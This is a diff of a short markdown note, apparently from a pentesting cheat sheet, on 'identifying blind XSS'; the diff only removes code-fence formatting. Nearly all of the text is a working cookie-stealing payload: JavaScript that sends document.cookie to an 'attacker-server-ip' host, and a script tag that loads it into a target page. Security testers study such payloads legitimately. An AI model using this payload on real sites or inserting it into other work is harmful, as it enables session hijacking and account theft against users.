@@ -1,9 +1,9 @@
 # Identifing blind xss
 ### 1. Host a temorary http server(attacker server) with below file and paste the below code inside as cookie.js
 
-``` var request = new XMLHttpRequest();<br/>
+var request = new XMLHttpRequest();<br/>
 request.open('GET', 'http://attacker-server-ip/?test='+document.cookie, true);<br/>
-request.send() ``` <br/>
+request.send()<br/>
 
 ### 2. Submit a payload which will render the above script
 ``` <script src="http://attacker-server-ip/cookie.js"></script> ```
